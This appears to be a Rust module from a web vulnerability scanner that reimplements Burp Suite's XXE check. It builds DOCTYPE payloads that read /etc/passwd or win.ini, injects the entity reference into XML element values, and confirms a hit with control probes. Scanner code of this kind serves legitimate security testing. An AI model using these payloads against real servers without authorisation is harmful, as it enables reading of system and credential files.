// Split from scan.rs (L5, issue #35). Bodies unchanged; visibility promoted
// to pub(crate) where siblings across the split need access.

use super::*;

/// burp.Zge7.ZC: the XXE DOCTYPE variants. 0 = win.ini, 1 = passwd, and the
/// negative controls 2/3 point at the non-existent `…X` files.
pub fn xxe_doctype(entity: &str, variant: u8) -> String {
    let target = match variant {
        1 => "file:///etc/passwd",
        2 => "file:///c:/windows/win.iniX",
        3 => "file:///etc/passwdX",
        _ => "file:///c:/windows/win.ini",
    };
    format!("<!DOCTYPE foo [<!ENTITY {entity} SYSTEM \"{target}\"> ]>")
}

/// burp.Zmku.ZY: where the DOCTYPE goes. Leading whitespace is skipped, and
/// the XML declaration is stepped over only when the body starts with `<?xml`.
pub fn xml_doc_start(body: &str) -> usize {
    let mut i = body.bytes().take_while(|b| *b <= b' ').count();
    if body[i..].starts_with("<?xml") {
        if let Some(end) = body[i..].find("?>") {
            i += end + 2;
        }
    }
    i
}

/// burp.Zmku.Zs: element-value insertion points (XML_PARAM) after `from`,
/// at most `max`. A point is the text range of a leaf element
/// (`<a>value</a>`, possibly empty). Attributes (XML_ATTR) are not points
/// (burp.Zge7.ZA skips them).
pub fn xml_value_points(body: &str, from: usize, max: usize) -> Vec<(usize, usize)> {
    let mut out = Vec::new();
    let bytes = body.as_bytes();
    let mut i = from;
    while out.len() < max {
        let Some(lt) = body[i..].find('<').map(|x| x + i) else {
            break;
        };
        let Some(gt) = body[lt..].find('>').map(|x| x + lt) else {
            break;
        };
        let tag = &body[lt + 1..gt];
        let is_start = !tag.starts_with('/')
            && !tag.starts_with('?')
            && !tag.starts_with('!')
            && !tag.ends_with('/');
        if is_start {
            let vs = gt + 1;
            if let Some(next) = body[vs..].find('<').map(|x| x + vs) {
                if bytes.get(next + 1) == Some(&b'/') {
                    out.push((vs, next));
                }
            }
        }
        i = gt + 1;
    }
    out
}

/// burp.Zmku.Zs + Zmku.ZW: the body actually probed and its points. With no
/// element value, Burp inserts `<data></data>` at the DOCTYPE position and
/// uses its empty value.
pub fn xxe_points(body: &str) -> (String, usize, Vec<(usize, usize)>) {
    let doc = xml_doc_start(body);
    let points = xml_value_points(body, doc, 10);
    if !points.is_empty() {
        return (body.to_string(), doc, points);
    }
    let base = format!("{}<data></data>{}", &body[..doc], &body[doc..]);
    (base, doc, vec![(doc + 6, doc + 6)])
}

/// burp.Zge7.Ze: DOCTYPE at the document position, then the original value
/// (Zsif.ZT0) followed by the entity reference in place of the value range.
pub fn xxe_probe_at(
    base: &str,
    doc: usize,
    point: (usize, usize),
    entity: &str,
    variant: u8,
) -> String {
    let (vs, ve) = point;
    format!(
        "{}{}{}{}&{entity};{}",
        &base[..doc],
        xxe_doctype(entity, variant),
        &base[doc..vs],
        &base[vs..ve],
        &base[ve..]
    )
}

/// burp.Zge7: for each of up to 10 element values, try win.ini then passwd;
/// report the first variant whose markers appear (baseline-suppressed) while
/// its `X` control (variant + 2) shows none.
pub fn run_xxe_check<F: FnMut(&str) -> Option<String>>(
    body: &str,
    baseline: &str,
    entity: &str,
    mut send: F,
) -> Option<FileReadHit> {
    let (base, doc, points) = xxe_points(body);
    for point in points {
        for os in [OS_WINDOWS, OS_UNIX] {
            let probe = xxe_probe_at(&base, doc, point, entity, os);
            let suppressed = file_marker_baseline(baseline, os);
            let Some(resp) = send(&probe) else { continue };
            let markers = file_marker_hits(&resp, os, &suppressed);
            if markers.is_empty() {
                continue;
            }
            let control =
                send(&xxe_probe_at(&base, doc, point, entity, os + 2)).unwrap_or_default();
            if !file_marker_hits(&control, os, &suppressed).is_empty() {
                continue;
            }
            let file = if os == OS_WINDOWS {
                "win.ini"
            } else {
                "/etc/passwd"
            };
            return Some(FileReadHit {
                payload: probe,
                file,
                markers,
            });
        }
    }
    None
}
